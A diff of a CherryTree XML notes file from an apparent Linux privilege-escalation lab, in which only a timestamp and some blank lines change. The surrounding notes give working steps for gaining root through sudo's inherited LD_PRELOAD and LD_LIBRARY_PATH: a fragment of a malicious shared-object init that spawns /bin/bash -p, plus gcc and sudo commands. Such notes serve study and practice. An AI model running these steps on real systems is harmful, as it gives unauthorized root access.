@@ -1068,7 +1068,7 @@ tools:
 linenum.sh
 linpeas.sh
 </rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="environment_variables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655874904.81" ts_lastsave="1655875021.19" unique_id="52">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="environment_variables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655874904.81" ts_lastsave="1655875029.26" unique_id="52">
 				<rich_text>Sudo can be configured to inherit certain environment variables from the user's environment.
 Check which environment variables are inherited (look for the env_keep options):
 </rich_text>
@@ -1111,26 +1111,29 @@ void _init() {
         system(&quot;/bin/bash -p&quot;);
 }
 
-
 Run one of the programs you are allowed to run via sudo (listed when running </rich_text>
 				<rich_text weight="heavy">sudo -l</rich_text>
 				<rich_text>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
 </rich_text>
 				<rich_text family="monospace">sudo LD_PRELOAD=/tmp/preload.so program-name-here</rich_text>
 				<rich_text>
+
 A  root shell should spawn. Exit out of the shell before continuing.  Depending on the program you chose, you may need to exit out of this as  well.
 Run ldd against the apache2 program file to see which shared libraries are used by the program:
 </rich_text>
 				<rich_text family="monospace">ldd /usr/sbin/apache2</rich_text>
 				<rich_text>
+
 Create  a shared object with the same name as one of the listed libraries  (libcrypt.so.1) using the code located at  /home/user/tools/sudo/library_path.c:
 </rich_text>
 				<rich_text family="monospace">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</rich_text>
 				<rich_text>
+
 Run  apache2 using sudo, while settings the LD_LIBRARY_PATH environment  variable to /tmp (where we output the compiled shared object):
 </rich_text>
 				<rich_text family="monospace">sudo LD_LIBRARY_PATH=/tmp apache2</rich_text>
 				<rich_text>
+
 A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1  to the name of another library used by apache2 and re-run apache2 using  sudo again. Did it work? If not, try to figure out why not, and how  the library_path.c code could be changed to make it work.
 
 
